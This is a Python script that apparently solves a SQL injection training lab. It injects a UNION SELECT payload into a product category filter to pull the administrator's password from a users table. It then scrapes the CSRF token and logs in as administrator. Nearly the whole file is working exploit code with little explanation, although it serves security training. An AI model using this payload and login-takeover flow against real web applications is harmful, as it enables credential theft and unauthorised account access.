# The database contains a different table called users, with columns called username and password. 
# Get the password of the administrator user and login with it to complete the lab

import requests
import re
from proxies import proxies
from sqli_utils import sqli_count_columns
import json

def solve(url: str, payload: str):
    r = requests.session()
    login_path = "/login"
    login_payload = {
        "username": "administrator",
        "password": "",
        "csrf": "0d7qBuWVD9bYbcrYMb28J6NiYKCt4IWf"
    }

    payload = "'+union+select+null,+password+from+users+where+username+=+'administrator'--"
    
    res = r.get(url + '/filter?category=' + payload, verify=False, proxies=proxies)
    if res.status_code == 504:
        print("[!] Error 504: Session Timeout")
        return False
    elif res.status_code == 500:
        print("[!] Error 500: Invalid SQLi")

    search_results = re.search('<td>(.*)</td>', res.text)
    if search_results: 
        login_payload["password"] = search_results.group(1)
        print("[+] Found password with for administrator user: " + login_payload["password"])
        # Initial request to get the csrf token in the page.
        setup_request = r.get(url + login_path, verify=False, proxies=proxies)
        csrf_token = (re.search('name="csrf" value="(.*)">', setup_request.text).group(1) if True else False)
        print("[+] CSRF Token Found: " + csrf_token)
        if csrf_token:
            login_payload["csrf"] = csrf_token
            login_result = r.post(url + login_path, data=login_payload, verify=False, proxies=proxies)
            if "Congratulations, you solved the lab!" in login_result.text:
                print("[+] ================================")
                print("[+] Login succeeded with user administrator")
                return True

    return False
